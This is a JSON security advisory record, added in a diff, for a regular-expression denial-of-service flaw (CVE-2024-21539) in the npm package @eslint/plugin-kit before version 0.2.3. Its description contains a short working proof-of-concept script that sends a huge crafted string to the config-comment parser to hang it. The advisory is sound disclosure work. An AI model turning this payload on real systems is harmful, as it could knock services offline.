@@ -1,0 +1,53 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2024-11-15T20:47:32Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@eslint/plugin-kit"
+  },
+  "Advisory": {
+    "DatabaseId": 267930,
+    "Id": "GSA_kwCzR0hTQS03cTdnLTR4bTgtODljcc4ABBaa",
+    "GhsaId": "GHSA-7q7g-4xm8-89cq",
+    "References": [
+      {
+        "Url": "https://github.com/eslint/rewrite/security/advisories/GHSA-7q7g-4xm8-89cq"
+      },
+      {
+        "Url": "https://github.com/eslint/rewrite/commit/071be842f0bd58de4863cdf2ab86d60f49912abf"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-7q7g-4xm8-89cq"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-7q7g-4xm8-89cq"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2024-21539"
+      }
+    ],
+    "Description": "Crafting a very large and well crafted string can increase the CPU usage and crash the program.\n\n## POC\n\n```js\nconst { ConfigCommentParser } = require(\"@eslint/plugin-kit\");\n\nvar str = \"\";\nfor (var i = 0; i \u003c 1000000; i++) {\n  str += \" \";\n}\nstr += \"A\";\n\nconsole.log(\"start\")\nvar parser = new ConfigCommentParser();\nconsole.log(parser.parseStringConfig(str, \"\"));\nconsole.log(\"end\")\n\n// run `npm i @eslint/plugin-kit` and `node attack.js` \n// then the program will stuck forever with high CPU usage\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2024-11-15T20:47:31Z",
+    "Severity": "HIGH",
+    "Summary": "Regular Expression Denial of Service (ReDoS) in @eslint/plugin-kit",
+    "UpdatedAt": "2024-11-15T20:47:32Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.2.3"
+      },
+      "VulnerableVersionRange": "\u003c 0.2.3"
+    }
+  ]
+}
